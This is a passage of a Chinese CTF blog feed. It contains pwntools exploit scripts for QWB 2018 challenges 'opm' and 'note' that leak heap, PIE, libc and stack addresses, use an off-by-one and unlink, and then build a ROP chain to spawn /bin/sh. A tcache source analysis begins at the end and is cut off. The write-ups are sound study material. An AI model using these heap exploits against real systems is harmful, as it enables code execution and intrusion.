class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./opm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'39.107.33.43'</span>, <span class="number">13572</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,punch)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'(E)xit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'A'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(<span class="string">'punch?\n'</span>)</span><br><span class="line">p.sendline(str(punch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'(E)xit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0x78</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x80</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="string">'d'</span>*<span class="number">0x18</span>,<span class="string">'d'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&lt;bbbbbbbb'</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap : '</span>, hex(heap_addr)</span><br><span class="line">offset = <span class="number">0x0000561b9016ec20</span> - <span class="number">0x561b9016edc0</span></span><br><span class="line">print_addr1 = heap_addr + offset</span><br><span class="line">offset2 = <span class="number">0x55f94cef9ed0</span> - <span class="number">0x55f94cef9dc0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] ptr_addr  : '</span>, hex(print_addr1)</span><br><span class="line">add(p64(print_addr1),<span class="string">'4'</span>)</span><br><span class="line">add(<span class="string">'e'</span>*<span class="number">10</span> , <span class="string">'e'</span>*<span class="number">0x80</span> + p64(heap_addr + offset2 <span class="number">-8</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">PIE = u64(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0XB30</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] pie  : '</span>, hex(PIE)</span><br><span class="line">add(p64(PIE+elf.got[<span class="string">'puts'</span>]),<span class="string">'5'</span>)</span><br><span class="line">offset3 = <span class="number">0x55f960027f70</span> - <span class="number">0x55f960027dc0</span></span><br><span class="line">add(<span class="string">'f'</span>*<span class="number">10</span> , <span class="string">'f'</span>*<span class="number">0x80</span> + p64(heap_addr + offset3 <span class="number">-8</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system  : '</span>, hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(p64(libc.address + <span class="number">0x4526a</span>),<span class="string">'6'</span>)</span><br><span class="line">block_exploit = heap_addr +<span class="number">0x5608f0cd5010</span> - <span class="number">0x5608f0cd4dc0</span></span><br><span class="line">add(<span class="string">'/bin/sh\0'</span>+<span class="string">'\x00'</span>*<span class="number">0x78</span> + p64(block_exploit) ,<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>此题最开始发现是标准的socket + fork写法，这样写法通常是会爆破canary或者地址，但是note这题暂时没用上。</p><p><strong>经AAA战队的大佬提醒，在note2题目中会用到，to becontinue…</strong></p><p>直接来看fork之后的函数，首先就是会getpwnam(”note“)操作，调试的时候，直接新建一个这个用户就能过了..</p><p>关键函数中，主要申请了3块内存</p><p><img src="/img/QWB2018/2_1.png" alt=""></p><p>对于title这个变量，是有限制的，遇到0x26232722403f210a任意一个时会截断，这样截断后会在堆块末尾写入这个截断值，此时会有一个溢出（off-by-one）。</p><p><img src="/img/QWB2018/2_2.png" alt=""></p><p>对于content变量，理论上智能改变3次，使用realloc进行扩容或者缩小。并且提供打印功能。</p><p><img src="/img/QWB2018/2_3.png" alt=""></p><p>对于comment变量是任意写的。</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此题比较特殊的点在于题目没有free，当没有free时，就需要创造free了…</p><p>通过阅读realloc代码，可以发现其处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* Try to expand forward into top */</span></span><br><span class="line">     <span class="keyword">if</span> (next == av-&gt;top &amp;&amp;</span><br><span class="line">         (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">         (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">       &#123;</span><br><span class="line">       ...</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Try to expand forward into next chunk;  split off remainder below */</span></span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (next != av-&gt;top &amp;&amp;</span><br><span class="line">              !inuse (next) &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         newp = oldp;</span><br><span class="line">         unlink (av, next, bck, fwd);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* allocate, copy, free */</span></span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">       **  newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">         <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">         newp = mem2chunk (newmem);</span><br><span class="line">         newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Avoid copy if newp is next chunk after oldp.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">         <span class="keyword">if</span> (newp == next)</span><br><span class="line">           &#123;</span><br><span class="line">             newsize += oldsize;</span><br><span class="line">             newp = oldp;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Unroll copy of &lt;= 36 bytes (72 if 8byte sizes)</span></span><br><span class="line"><span class="comment">                We know that contents have an odd number of</span></span><br><span class="line"><span class="comment">                INTERNAL_SIZE_T-sized words; minimally 3.</span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line">              ......   </span><br><span class="line"></span><br><span class="line">      **       _int_free (av, oldp, <span class="number">1</span>);</span><br><span class="line">             check_inuse_chunk (av, newp);</span><br><span class="line">             <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>在标**的行发现，realloc当想要拓展当前块的时候，会检查下一块释放被占用，如果被占用，则会利用int_malloc函数申请一个新的堆块，并且释放原来占用的堆块。</p><p>分析一下现状：</p><ul><li><p>存在一个指针数组在bss段上，指针会指向堆地址</p></li><li><p>存在off-by-one，可以修改content所在堆块大小，但只能修改为特定值，且小于原来的堆块大小</p></li><li><p>content前块和后块内容均可以任意写</p></li></ul><p>想到的一个思路是unlink，这样就可以劫持bss段的数组进而可以任意读任意写。</p><p>首先，想到content块会变小，如果与后面的堆空间unlink，会过不去libc的检测，因为没有指针指向后块地址，因此需要选择前块作为unlink的目标块，则size需要覆盖为pre_inuse为0的值（0x40），选定了这个值以后，前块的fake chunk就可以构造了。</p><p>然后，需要思考如何触发unlink。在第一次realloc时，libc会将改小的堆块放到fastbin中去，而这时需要如何触发unlink呢？</p><p>在查看代码中发现，malloc_consolidate函数会对fastbin链中各个堆块进行遍历，对符合前后块！inuse的堆块做unlink，这样恰好符合需求。</p><p>在什么时候会触发malloc_consolidate呢？在_int_malloc 中发现，在申请较大堆块，导致前面的一系列分配均无法满足时，会触发该函数。因此，我选择申请0x21000大小的堆块，该堆块大于brk分配的初始堆大小，则一定可以触发malloc_consolidate</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>剩下的步骤，就是如何构造前后堆块使其在malloc_consolidate中可以通过系统的check了。</p><p>当这一步完成时，在bss段上的指针数组里，就出现交叉的情况了，通过编辑title内容，就可以对bss段数组上的数据任意写，并且可以写多次。</p><p>首先利用got表泄露libc地址，然后再泄露libc中environ变量的地址（栈地址），最后对返回地址写入rop，就可以拿到shell了（其实最简单的方法是对__malloc_hook写one_gadget，但测试过程中，libc的四个one_gadget均不可用…）</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>)<span class="comment">#process('./300')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'39.107.14.183'</span>, <span class="number">1234</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_title</span><span class="params">(title)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'title:'</span>)</span><br><span class="line">p.send(title)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_content</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(64-256):'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_comment</span><span class="params">(content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'comment:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_content</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'--&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'welcome to the note '</span>)</span><br><span class="line">offset = int(p.recv(<span class="number">4</span>),<span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*]'</span>, str(offset + <span class="number">0x10</span>),hex(offset +<span class="number">0x10</span>)</span><br><span class="line">change_content(<span class="number">0x78</span>,p64(<span class="number">0x41</span>)*(<span class="number">8</span>)+p64(<span class="number">0x80</span>)*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">change_title(p64(<span class="number">0x11</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602070</span><span class="number">-0x18</span>)+p64(<span class="number">0x602070</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+<span class="string">'@'</span>)</span><br><span class="line">change_content(<span class="number">150</span>,<span class="string">'a'</span>*<span class="number">110</span>+<span class="string">'\n'</span>)</span><br><span class="line">change_title(p64(offset+<span class="number">0x10</span><span class="number">-0x20</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602070</span><span class="number">-0x18</span>)+p64(<span class="number">0x602070</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+<span class="string">'a'</span>)</span><br><span class="line">change_content(<span class="number">0x21000</span>,<span class="string">'a'</span>*<span class="number">110</span>+<span class="string">'\n'</span>)</span><br><span class="line">change_title(p64(<span class="number">0x602058</span>)+p64(elf.got[<span class="string">'puts'</span>])+p64(<span class="number">0x78</span>)+p64(<span class="number">0x602058</span>)+<span class="string">'\n'</span>)</span><br><span class="line">show_content()</span><br><span class="line">p.recvuntil(<span class="string">'is:'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">change_comment(p64(<span class="number">0x602058</span>)+p64(libc.symbols[<span class="string">'environ'</span>])+p64(<span class="number">0x78</span>)+p64(<span class="number">0x602058</span>)+<span class="string">'\n'</span>)</span><br><span class="line">show_content()</span><br><span class="line">p.recvuntil(<span class="string">'is:'</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack: '</span>,hex(stack_addr)</span><br><span class="line">offset =  <span class="number">0x7fffffffe4b8</span>- <span class="number">0x7fffffffe338</span> </span><br><span class="line">change_comment(p64(stack_addr - offset )+p64(libc.symbols[<span class="string">'environ'</span>])+p64(<span class="number">0x78</span>)+p64(<span class="number">0x602058</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">change_comment(p64(<span class="number">0x0000000000401673</span>)+p64(next(libc.search(<span class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040166c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401670 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401672 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400e00 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401673 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401671 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040166d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c71 : ret</span></span><br><span class="line"><span class="string">0x00000000004002c1 : ret 0x200</span></span><br><span class="line"><span class="string">0x0000000000401300 : ret 0x8948</span></span><br><span class="line"><span class="string">0x00000000004012f6 : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000400fe5 : ret 0xb60f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 15</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;opm&quot;&gt;&lt;a href=&quot;#opm&quot; class=&quot;headerlink&quot; title=&quot;opm&quot;&gt;&lt;/a&gt;opm&lt;/h1&gt;&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>tcache 源码分析及利用思路</title>
    <link href="http://p4nda.top/2018/03/20/tcache/"/>
    <id>http://p4nda.top/2018/03/20/tcache/</id>
    <published>2018-03-20T11:05:53.000Z</published>
    <updated>2018-03-21T02:23:43.204Z</updated>
    
    <content type="html"><![CDATA[<p>tcache，全称是thread local caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高，第一次见到这个结构是在34C3 CTF中的SimpleGC一题。</p><h1 id="总体简介"><a href="#总体简介" class="headerlink" title="总体简介"></a>总体简介</h1><p>tcache是一个用于加速malloc分配的缓存结构，有由64个链表组成。其优先级很高，会先于全部的bin来处理。每个链表的个数是一定的，当缓存链表装满时，分配方式就与之前版本的malloc相同。但使用了tcache版本的malloc与free函数时，对于堆块的安全性检查就相比于之前的版本弱化很多。</p><p>本文依据的代码是libc 2.26，最新出的libc 2.27似乎与2.26相差不多，多了一个SINGLE_THREAD_P变量，用于细化单线程与多线程的处理逻辑，对此研究不深。</p><h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>tcache增加了两个全新的结构体，tcache_entry、tcache_perthread_struct。并且在libc内部定义了两个线程局部变量，该局部变量使得在每一个线程内部维护一个tcache结构，当在某线程内部释放内存时，无论内存块属于哪个分配区，都会挂到<strong>释放该内存块线程</strong>的tcache中。</p><p>tcache_entry结构体，看上去并不明白是做什么用的，但在分析代码中发现，这就是一个<strong>单链表结构指针</strong>。</p><p>tcache_pthread_struct结构体，是一个线程tcache的主体，由两个数组组成。其中，entries数据代表tcache的各个链表，共TCACHE_MAX_BINS个（默认为64），counts数组代表每一个单链表内有多少个内存块。</p><p>这个tcache结构的组装与<strong>fastbin</strong>非常相似 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>常量定义：从常量中可以看出，默认配置情况下，结构体最多的单链表个数是64个，每个单链表中最多有7个内存块，可容纳的最大内存块大小是1032。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 